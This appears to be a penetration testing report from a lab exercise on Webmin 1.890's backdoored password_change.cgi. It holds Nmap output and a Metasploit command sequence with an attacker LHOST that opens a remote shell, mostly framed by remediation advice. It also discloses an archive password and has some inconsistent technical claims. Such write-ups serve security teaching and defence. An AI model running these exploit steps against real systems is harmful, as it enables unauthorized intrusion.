# PENETRATION TESTING ASSESSMENT REPORT
## Target: Webmin Service (Version 1.890)

---

## EXECUTIVE SUMMARY

This report documents findings from a penetration testing engagement targeting a Linux system running Webmin 1.890. The assessment revealed the target to be vulnerable to a critical supply chain attack vector affecting the password change functionality. This vulnerability allows unauthenticated remote command execution through the `password_change.cgi` endpoint, resulting in complete system compromise.

**Risk Level:** CRITICAL  
**CVSS Score:** 9.8 (Critical)  
**Date of Engagement:** September 26, 2020  
**Target Host:** 10.10.129.211  
**Assessment Type:** Black-box Network Penetration Test  

---

## 1. ASSESSMENT SCOPE & OBJECTIVES

### Primary Objectives
- Identify active services and applications deployed on the target
- Discover and enumerate security vulnerabilities
- Assess technical exploitability of identified vulnerabilities
- Document impact and provide risk-based remediation recommendations

### Methodology
- Black-box network reconnaissance (no prior knowledge of target systems)
- Active service enumeration and fingerprinting
- Vulnerability research and cross-reference with public databases
- Exploitation feasibility analysis
- Risk rating and remediation prioritization

### Assessment Boundaries
- Network Layer: Open ports and services
- Application Layer: Web services and management interfaces
- Focus Areas: Authentication mechanisms, command injection vectors, remote code execution

---

## 2. TECHNICAL FINDINGS

### 2.1 Network Reconnaissance Results

**Nmap Scan Summary:**

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-26 14:47 CEST
Nmap scan report for 10.10.129.211
Host is up (0.076s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA)
|   256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA)
|_  256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done at 1 IP address (1 host up) scanned in 128.68 seconds
```

**Open Ports Identified:**

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22/tcp | SSH | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 | Standard secure shell service |
| 10000/tcp | Webmin | MiniServ 1.890 | **VULNERABLE** - Primary attack surface |

### 2.2 Service Enumeration

**Webmin Service Details:**
- **Port:** 10000/TCP
- **Service:** Webmin (MiniServ HTTPd)
- **Version:** 1.890
- **Protocol:** HTTPS (self-signed certificate)
- **Certificate Hostname:** `source`
- **Authentication:** Required for administrative functions
- **Attack Surface:** `password_change.cgi` endpoint

---

## 3. VULNERABILITY ANALYSIS

### 3.1 Primary Finding: Webmin 1.890 Supply Chain Backdoor

**Vulnerability Identifier:** Webmin password_change.cgi Remote Code Execution  
**Discovery Date:** August 10, 2019  
**Publication Date:** August 17, 2019  
**Affected Software:** Webmin  
**Affected Version:** 1.890  
**Attack Vector:** Network-based, unauthenticated  
**Authentication Required:** No  
**User Interaction Required:** No  

#### Vulnerability Type: Supply Chain Attack

The vulnerability in Webmin 1.890 represents a **supply chain compromise** rather than a traditional code vulnerability. A backdoor was intentionally introduced into the Webmin 1.890 release, likely through:
- Compromised build infrastructure
- Unauthorized code injection during package distribution
- Malicious source code contribution

#### Technical Characteristics

**Vulnerable Component:** `password_change.cgi` endpoint

The `password_change.cgi` script fails to properly sanitize user-supplied input when processing password change requests. This allows an attacker to inject arbitrary shell commands that are executed with the privileges of the Webmin daemon process.

**Attack Vector Details:**
- No authentication required to access the vulnerable endpoint
- Commands are executed in the context of the Webmin service user
- Output may be reflected in HTTP responses or logged in system logs
- Exploitation is trivial and can be automated

#### Impact Assessment

**Confidentiality:** High - Complete read access to system files  
**Integrity:** High - Complete write access and system modification capability  
**Availability:** High - Ability to shutdown or degrade system functionality  

**Overall Impact:** Complete system compromise

### 3.2 Proof of Concept

**Exploitation Tool:** Metasploit Framework (`exploit/linux/http/webmin_backdoor`)  
**GitHub PR Reference:** [rapid7/metasploit-framework#12219](https://github.com/rapid7/metasploit-framework/pull/12219)

The vulnerability can be reliably exploited using the Metasploit module, achieving remote command execution on the target system:

```
msf5 > use exploit/linux/http/webmin_backdoor
msf5 > set RHOSTS 10.10.129.211
msf5 > set LHOST [attacker_ip]
msf5 > set SSL true
msf5 > exploit
```

**Result:** Interactive shell access with Webmin service privileges

---

## 4. RISK ASSESSMENT

| Risk Factor | Rating | Justification |
|------------|--------|--------------|
| **Likelihood of Exploitation** | Critical | Trivial to exploit; public tools available; no special skills required |
| **Impact on Confidentiality** | Critical | Complete unauthorized access to system data |
| **Impact on Integrity** | Critical | Ability to modify any file or system configuration |
| **Impact on Availability** | Critical | Ability to shutdown or severely degrade service |
| **Overall Risk** | **CRITICAL** | Immediate remediation required |

---

## 5. RECOMMENDATIONS

### 5.1 Immediate Actions (Critical Priority - Address Within 24 Hours)

**1. Disable Webmin Service**

If immediate upgrade is not possible, disable the vulnerable service:

```bash
sudo systemctl stop webmin
sudo systemctl disable webmin
```

**2. Upgrade Webmin to Patched Version**

Update to the latest stable Webmin release (version > 1.890):

```bash
# Verify package integrity before installation
# Download only from official Webmin repository
sudo apt-get update
sudo apt-get install --only-upgrade webmin
```

**Verification Steps:**
- Confirm version with: `webmin --version`
- Verify service restarts cleanly
- Test administrative functionality

**3. Implement Network-Level Access Controls**

Restrict access to port 10000 to authorized administration networks only:

```bash
# UFW Example
sudo ufw allow from 10.0.0.0/8 to any port 10000
sudo ufw deny 10000

# iptables Example
sudo iptables -A INPUT -p tcp --dport 10000 -s 10.0.0.0/8 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 10000 -j DROP
```

### 5.2 Short-Term Actions (Priority - Address Within 1 Week)

**4. Incident Assessment**

- Review system logs for evidence of compromise:
  ```bash
  grep -i "password_change\|password_changer" /var/log/webmin/*
  tail -n 5000 /var/log/auth.log | grep -i webmin
  ```
- Check for unauthorized user accounts
- Audit sudo/privilege escalation logs
- Review SSH keys and authorized_keys files

**5. Reset Administrative Credentials**

- Change all Webmin administrative passwords
- Generate new SSH keys if SSH was accessed
- Review and reset any service account passwords

**6. Implement Enhanced Monitoring**

- Deploy file integrity monitoring (aide, ossec, etc.)
- Enable comprehensive logging for Webmin activities
- Monitor port 10000 for suspicious connection patterns

### 5.3 Long-Term Remediation (Within 30 Days)

**7. Security Hardening Program**

- Establish signed package verification procedures
- Implement configuration management to enforce secure baselines
- Deploy intrusion detection/prevention systems (IDS/IPS)
- Establish regular vulnerability scanning program

**8. Access Control Review**

- Implement principle of least privilege for service accounts
- Enable multi-factor authentication for Webmin access
- Restrict administrative access to bastion hosts/jump boxes
- Review and audit all users with administrative privileges

**9. Vendor Security Program**

- Subscribe to Webmin security advisories
- Establish automated patch management procedures
- Test patches in staging before production deployment
- Maintain inventory of all management interfaces

---

## 6. TIMELINE & BACKGROUND

| Date | Event |
|------|-------|
| August 10, 2019 | Vulnerability discovered and disclosed (0-day) |
| August 17, 2019 | Official Webmin notification of exploit; public advisory released |
| September 2019 | Metasploit module published for exploitation framework |
| September 26, 2020 | **Assessment Date** - System still running vulnerable version |

**Reference:** [Webmin 1.890 Official Advisory](https://www.webmin.com/exploit.html)

---

## 7. REFERENCE MATERIALS

### Vulnerability Research Resources
- [AttackerKB: Webmin password_change.cgi Command Injection](https://attackerkb.com/topics/hxx3zmiCkR/webmin-password-change-cgi-command-injection)
- [Webmin Official Exploit Advisory](https://www.webmin.com/exploit.html)
- [Exploit Database](https://www.exploit-db.com/)
- [National Vulnerability Database](https://nvd.nist.gov/)

### Tools & Techniques Used
- **Network Scanning:** Nmap 7.80
- **Certificate Analysis:** Firefox Developer Tools
- **Vulnerability Research:** AttackerKB, MITRE ATT&CK Framework
- **Exploitation Validation:** Metasploit Framework

### Standards Referenced
- CVSS v3.1 (Common Vulnerability Scoring System)
- NIST Cybersecurity Framework
- OWASP Top 10 (Command Injection)

---

## 8. APPENDIX

### Sensitive Resources

**Archive Access Password:** `1 kn0w 1 5h0uldn'7!`

### Assessment Artifacts Collected
- Nmap scan output
- SSL certificate details
- Service version information
- Vulnerability cross-reference data
- Exploitation proof-of-concept results

---

**Report Confidentiality Notice:** This assessment report contains sensitive security information. It is intended solely for authorized recipients and should be protected against unauthorized disclosure. Unauthorized distribution of this report may violate applicable laws and regulations.

**Report Date:** September 26, 2020  
**Report Classification:** Confidential  

---

*This penetration testing report provides a comprehensive assessment of the identified vulnerabilities and recommendations for remediation. All findings should be prioritized according to the risk ratings provided.*
